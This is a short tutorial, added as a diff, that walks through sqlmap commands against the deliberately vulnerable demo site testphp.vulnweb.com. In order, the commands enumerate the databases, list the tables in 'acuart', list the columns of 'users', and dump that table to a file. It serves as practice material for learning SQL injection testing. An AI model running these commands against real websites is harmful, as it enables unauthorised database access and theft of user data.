@@ -1,1 +1,27 @@
+Following query will determine whether or not the specified URL (the website) is vulnerable.
+
+ $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " --dbs
+
+
+
+When the above query executes successfully, it notifies you of the website's vulnerability and provides the names of the databases it includes.
+The GET method is the vulnerability in my scenario.
+
+following querry is to find the tables name of a specific Database
+
+ $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D acuart --tables  
+
+
+
+
+he above query returns the names of the tables in the specified database.
+
+The following query will work as a demonstration.
+
+ $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D acuart -T users --columns
+
+
+following command is used to save table of database into .csv file extention
+
+ $ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2 " -D acuart -T users -dump
 
